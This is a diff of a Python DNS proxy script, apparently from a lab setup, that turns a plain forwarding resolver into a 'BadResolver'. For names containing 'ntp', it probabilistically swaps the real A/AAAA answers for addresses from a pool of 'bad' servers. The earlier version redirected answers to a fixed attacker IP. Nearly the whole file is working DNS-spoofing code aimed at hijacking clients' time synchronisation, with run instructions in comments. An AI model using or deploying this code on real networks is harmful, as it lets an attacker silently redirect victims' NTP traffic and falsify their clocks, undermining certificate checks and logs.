@@ -1,5 +1,4 @@
-#!/usr/bin/env python3.6
-# EDITED BY MAY YAARON
+#!/usr/bin/env python3.7
 import json
 import logging
 import os
@@ -8,20 +7,20 @@ from datetime import datetime
 from pathlib import Path
 from textwrap import wrap
 from time import sleep
-import random
 
 from dnslib import DNSLabel, QTYPE, RR, dns
 from dnslib.proxy import ProxyResolver
 from dnslib.server import DNSServer
+import random
+SERIAL_NO = int((datetime.utcnow() - datetime(1970, 1, 1)).total_seconds())
 
-# SERIAL_NO = int((datetime.utcnow() - datetime(1970, 1, 1)).total_seconds())
-logger = logging.getLogger()
-handler = logging.FileHandler(f'logfile_{datetime.now().strftime("%m_%d-%H-%M")}.log')
+handler = logging.StreamHandler()
+handler.setLevel(logging.INFO)
 handler.setFormatter(logging.Formatter('%(asctime)s: %(message)s', datefmt='%H:%M:%S'))
 
+logger = logging.getLogger(__name__)
 logger.addHandler(handler)
 logger.setLevel(logging.INFO)
-
 
 TYPE_LOOKUP = {
     'A': (dns.A, QTYPE.A),
@@ -46,6 +45,7 @@ class Record:
         self._rname = DNSLabel(rname)
 
         rd_cls, self._rtype = TYPE_LOOKUP[rtype]
+
         if self._rtype == QTYPE.SOA and len(args) == 2:
             # add sensible times to SOA
             args += (SERIAL_NO, 3600, 3600 * 3, 3600 * 24, 3600),
@@ -76,48 +76,131 @@ class Record:
         return str(self.rr)
 
 
-class Resolver(ProxyResolver):
-    def __init__(self, upstream, attacker):
-        super().__init__(upstream, 53, 5)
-        self.attacker = attacker
+class BadResolver(ProxyResolver):
+    def __init__(self, upstream, ip_file, bad_ip_pool_file, bad_probability=0.3, timeout=5):
+        super(BadResolver, self).__init__(upstream, 53, timeout)
+
+        if os.path.isfile(ip_file):
+            with open(ip_file ,'r') as f2:
+                self.ips = json.load(f2)
+        else:
+            self.ips = {"good": {}, "bad": {}}
+        self.ip_file = ip_file
+        with open(bad_ip_pool_file, 'r') as f:
+
+            self.bad_ip_pool = json.load(f)
+        self.bad_probability = bad_probability
+
+    def update_ip_file(self):
+        with open(self.ip_file, 'w') as f3:
+            json.dump(self.ips, f3, sort_keys=True, indent=4, separators=(',', ': '))
+
+    def inspect_rdata(self, rdata):
+        if type(rdata) in [dns.A, dns.AAAA]:
+            ip = repr(rdata)
+            if ip in self.ips["good"]:
+                print(">>> %s in good (remains the same)" % ip)
+                return rdata
+            elif ip in self.ips["bad"]:
+                new_ip = self.ips["bad"][ip]
+                print( ">>> %s in bad, replacing with %s" % (ip, new_ip))
+                return dns.A(new_ip)
+            else:
+                t = random.random()
+                print(f"{t} < {self.bad_probability} ???????????????????????")
+                if t < self.bad_probability:
+                    ip_index = random.randrange(0, len(self.bad_ip_pool))
+                    new_ip = self.bad_ip_pool[ip_index]
+                    print( ">>> %s new, replaced with bad %s" % (ip, new_ip))
+                    new_rdata = dns.A(new_ip)
+                    if len(self.ips["bad"]) < len(self.bad_ip_pool):
+                        self.ips["bad"][ip] = new_ip
+                        self.update_ip_file()
+                    return new_rdata
+                else:
+                    if len(self.ips["bad"]) < len(self.bad_ip_pool):
+                        self.ips["good"][ip] = rdata.__class__.__name__  # str(type(rdata)).rsplit(".", 1)[-1]
+                        self.update_ip_file()
+                        print( ">>> %s new, added to good ips" % (ip, ))
+                        return rdata
+                    print(self.ips["good"])
+                    ip_index = random.randrange(0, len(self.ips["good"]))
+                    print(self.ips["good"])
+#                    new_ip = random.choice(self.ips["good"].keys()[ip_index])
+                    new_ip = list(self.ips["good"].keys())[ip_index]
+                    print( ">>> %s new, replaced with good %s" % (ip, new_ip))
+                    rtype = self.ips["good"][new_ip]
+                    if rtype == "A":
+                        new_rdata = dns.A(new_ip)
+                    else:
+                        new_rdata = dns.AAAA(new_ip)
+                    return new_rdata
+        return rdata
+
+    def inspect_rr(self, rr):
+#        print(f"\033[34m {str(rr.rname).lower()} \033[0m")
+        if "ntp" in str(rr.rname).lower():
+            rr.rdata = self.inspect_rdata(rr.rdata)
 
     def resolve(self, request, handler):
-        reply = super().resolve(request, handler)
-        for i in range(len(reply.rr)):
-            if reply.rr[i].rtype not in TYPE_LOOKUP['A']:
-                continue
-            if random.random() < attack_probability:
-                reply.rr[i].rdata = dns.A(self.attacker)
-        print(reply)
-        logger.info(reply)
-        return reply
+        print(f"\033[33m {request} \033[0m")
+        type_name = QTYPE[request.q.qtype]
+        replay = super(BadResolver, self).resolve(request, handler)
+        print(f"\033[34m ========= before changing: =========\n{replay} \033[0m")
+#        map(self.inspect_rr, replay.rr)
+        for i in range(len(replay.rr)):
+            self.inspect_rr(replay.rr[i])
+        print(f"\033[35m ========= after changing: =========\n{replay} \033[0m")
+        return replay
+
 
 
 def handle_sig(signum, frame):
     logger.info('pid=%d, got signal: %s, stopping...', os.getpid(), signal.Signals(signum).name)
     exit(0)
 
+# dig @localhost -q pool.ntp.org -p 1053
 
+# sudo -i
+# cd /media/sf_temp
+# PORT=1053 python  bad_dns_server.py
 if __name__ == '__main__':
-    # for the signal SIGTERM - call the handle_sig function
-    logger.info("start DNS file")
+
+    line_args = [datetime.utcnow().strftime("%Y%m%d_%H%M%S")] + os.sys.argv
+    with open(os.sys.argv[0]+".log", "a+") as f:
+        f.write(" ".join(line_args))
+    import argparse
+
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-p", "--port", type=int, default=53,
+                        help="listening port")
+    parser.add_argument("-u", "--upstream_server", default="8.8.8.8",
+                        help="upstream DNS server")
+    parser.add_argument("-i", "--ips_state_file", default='ips.json',
+                        help="current ips state file path")
+    parser.add_argument("-b", "--bad_server_pool", default='bad_ips_pool3.json',
+                        help="path for bad server pool")
+    parser.add_argument("-r", "--bad_probability", type=float, default=0.8,
+                        help="bad server ratio")
+    parser.add_argument("-P", "--upstream_port", type=int, default=53,
+                        help="upsrteam DNS server port")
+    parser.add_argument("-d", "--dont_attack", action="store_true",
+                        help="don't attack - forward everything to upstream")
+    args = parser.parse_args()
+
     signal.signal(signal.SIGTERM, handle_sig)
-
-    port = int(os.getenv('PORT', 53))
-    close_traffic = bool(int(os.getenv('CLOSE', 1)))
-    attack_probability = float(os.getenv('P', 0.2))
-    upstream = os.getenv('UPSTREAM', '8.8.8.8')
-    attacker_ip = os.getenv('ATTACKER', '10.0.28.196')
-    zone_file = Path(os.getenv('ZONE_FILE', 'zones2.txt'))
-    resolver = Resolver(upstream, attacker_ip)
-    udp_server = DNSServer(resolver, port=port)
-    tcp_server = DNSServer(resolver, port=port, tcp=True)
-
-    logger.info('starting DNS server on port %d, attack prob is %f"', port, attack_probability)
-    if close_traffic:
-        logger.info('traffic is closed, every unknown ip will be redirected to one of the known hosts.')
+    if not args.dont_attack:
+        resolver = BadResolver(
+            upstream=args.upstream_server,
+            ip_file=args.ips_state_file,
+            bad_ip_pool_file=args.bad_server_pool,
+            bad_probability=args.bad_probability)
     else:
-        logger.info('traffic is open, upstream DNS server "%s', upstream)
+        resolver = ProxyResolver(address=args.upstream_server, port=args.upstream_port, timeout=5)
+    udp_server = DNSServer(resolver, port=args.port)
+    tcp_server = DNSServer(resolver, port=args.port, tcp=True)
+
+    logger.info('starting DNS server on port %d, upstream DNS server "%s"', args.port, args.upstream_server)
     udp_server.start_thread()
     tcp_server.start_thread()
 
@@ -126,4 +209,3 @@ if __name__ == '__main__':
             sleep(1)
     except KeyboardInterrupt:
         pass
-
